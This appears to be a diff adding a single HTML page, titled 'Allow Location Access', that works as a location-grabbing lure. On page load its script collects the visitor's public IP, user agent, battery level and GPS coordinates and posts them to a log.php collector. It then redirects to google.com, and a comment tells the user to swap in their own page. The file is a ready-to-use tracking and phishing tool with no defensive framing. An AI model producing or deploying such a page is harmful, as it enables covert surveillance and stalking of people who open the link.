@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">                                           <head>
+  <meta charset="UTF-8">                                     <title>Allow Location Access</title>                       <script>                                                     async function sendData() {                                  try {
+        let ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
+        let userAgent = navigator.userAgent;
+        let battery = await navigator.getBattery();
+
+        navigator.geolocation.getCurrentPosition(position => {
+          let data = {
+            ip: ipData.ip,
+            userAgent: userAgent,
+            battery: {
+              level: Math.round(battery.level * 100) + "%",
+              charging: battery.charging ? "Yes" : "No"
+            },
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude
+          };
+
+          fetch('log.php', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(data)
+          }).then(() => {
+            // Redirect after successful location access
+            window.location.href = "https://google.com"; // replace with your real page
+          });
+
+        }, error => {
+          alert("Location access denied.");
+        });
+      } catch (e) {
+        console.error("Error collecting data:", e);
+      }
+    }
+
+    window.onload = sendData;
+  </script>
+</head>
+<body style="background:#000;color:#39ff14;text-align:center;font-family:monospace">
+  <h2>📍 Allow Location to Continue</h2>
+</body>
+</html>
